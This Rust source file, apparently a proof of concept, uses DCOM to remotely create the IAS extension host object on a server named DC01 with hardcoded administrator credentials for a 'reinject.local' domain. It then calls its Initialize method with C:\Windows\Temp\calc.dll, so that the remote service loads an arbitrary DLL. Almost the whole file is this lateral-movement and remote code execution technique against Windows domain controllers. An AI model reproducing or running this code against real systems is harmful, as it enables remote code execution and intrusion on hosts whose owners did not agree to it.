#![allow(non_snake_case, non_upper_case_globals, non_camel_case_types)]
use combase::IIASExtentionHost;
use windows::{
    core::{w, ComInterface, PCWSTR, PWSTR, HRESULT},
    Win32::{
        NetworkManagement::NetworkPolicyServer::{repAuthentication, repAuthorization},
        System::{Com::{
            CoCreateInstanceEx, CoInitializeEx, CoInitializeSecurity,
            CoUninitialize, COINIT_MULTITHREADED,
            COSERVERINFO, EOAC_DYNAMIC_CLOAKING, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE, MULTI_QI, CLSCTX_REMOTE_SERVER, COAUTHIDENTITY, COAUTHINFO, RPC_C_AUTHN_LEVEL_DEFAULT, EOAC_NONE, RPC_C_AUTHN_LEVEL_PKT,
        }, Rpc::{RPC_C_AUTHZ_NONE, RPC_C_AUTHN_DEFAULT, SEC_WINNT_AUTH_IDENTITY_UNICODE}, Threading::{GetCurrentThread, OpenThreadToken}, Memory::{LocalAlloc, LPTR}, Diagnostics::Debug::DebugBreak}, Security::{PSECURITY_DESCRIPTOR, Authorization::{GetSecurityInfo, SE_KERNEL_OBJECT}, OWNER_SECURITY_INFORMATION, DACL_SECURITY_INFORMATION, TOKEN_QUERY, GetTokenInformation, TokenDefaultDacl, ImpersonateSelf, SecurityImpersonation, RevertToSelf}, Foundation::{LocalFree, HLOCAL, HANDLE},
    },
};
pub mod combase;

fn main() {
    unsafe {
        // 初始化 COM
        CoInitializeEx(None, COINIT_MULTITHREADED).unwrap();

        // 获取当前线程的安全描述符
        let threadhandle = GetCurrentThread();
        let mut tokenhandle: HANDLE = std::mem::zeroed();

        // 分配线程令牌
        ImpersonateSelf(SecurityImpersonation).unwrap();

        OpenThreadToken(threadhandle, TOKEN_QUERY, false, &mut tokenhandle).unwrap();
        // 获取安全描述符长度
        let mut sdlen = 0;
        GetTokenInformation(tokenhandle, TokenDefaultDacl, None, 0, &mut sdlen).unwrap_unchecked();
        // 分配安全描述符内存
        let psecdesc = PSECURITY_DESCRIPTOR(LocalAlloc(LPTR, sdlen as _).unwrap().0);
        // 获取安全描述符
        GetTokenInformation(tokenhandle, TokenDefaultDacl, Some(psecdesc.0), sdlen, &mut sdlen).unwrap();

        CoInitializeSecurity(
            // psecdesc,
            None,
            -1,
            None,
            None,
            RPC_C_AUTHN_LEVEL_PKT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            None,
            EOAC_NONE,
            None,
        )
        .unwrap();

        // 创建 IIASExtentionHost 实例
        let iIASExt: &IIASExtentionHost;
        // let iIASExt: IIASExtentionHost = CoCreateInstance(&combase::CLSID_IASExtentionHost, None, CLSCTX_ALL).unwrap();

        let multi_qi = MULTI_QI {
            pIID: &combase::IIASExtentionHost::IID,
            pItf: std::mem::ManuallyDrop::new(None),
            hr: HRESULT(0),
        };
        let multi_qi_ptr: *mut [MULTI_QI] = &mut [multi_qi];
        let mut id: COAUTHIDENTITY = std::mem::zeroed();
        id.User = w!("Adminsitrator").as_ptr() as _;
        id.UserLength = 13;
        id.Password = w!("Admin@123").as_ptr() as _;
        id.PasswordLength = 9;
        id.Domain = w!("reinject.local").as_ptr() as _;
        id.DomainLength = 14;
        id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE.0;
        let mut ca: COAUTHINFO = COAUTHINFO {
            dwAuthnSvc: RPC_C_AUTHN_DEFAULT as _,
            dwAuthzSvc: RPC_C_AUTHZ_NONE,
            pwszServerPrincName: PWSTR::null(),
            dwAuthnLevel: RPC_C_AUTHN_LEVEL_DEFAULT.0,
            dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE.0,
            pAuthIdentityData: &mut id,
            dwCapabilities: EOAC_NONE.0 as _,
        };
        let mut server_info: COSERVERINFO = std::mem::zeroed();
        server_info.pwszName = PWSTR(w!("DC01").as_ptr() as *mut u16);
        server_info.pAuthInfo = &mut ca;
        CoCreateInstanceEx(
            &combase::CLSID_IASExtentionHost, 
            None, 
            CLSCTX_REMOTE_SERVER, 
            Some(&server_info), 
            std::mem::transmute(multi_qi_ptr)
        ).unwrap();
        iIASExt = std::mem::transmute((*multi_qi_ptr.clone())[0].pItf.as_ref().unwrap());

        // 打印 IIASExtentionHost 实例的地址
        println!("{:?}", iIASExt);

        let dll_path = w!("C:\\Windows\\Temp\\calc.dll");
        let mut dll_path_vec = dll_path.as_wide().to_vec();
        dll_path_vec.push(0x00);
        dll_path_vec.push(0x00);

        DebugBreak();

        iIASExt
            .Initialize(
                repAuthorization,
                (dll_path_vec.len() * 2) as u32,
                PCWSTR(dll_path_vec.as_ptr() as *const u16),
            )
            .unwrap();

        println!("OK");

        // 清理
        RevertToSelf().unwrap();
        LocalFree(HLOCAL(psecdesc.0 as _)).unwrap();
        CoUninitialize();
    }
}
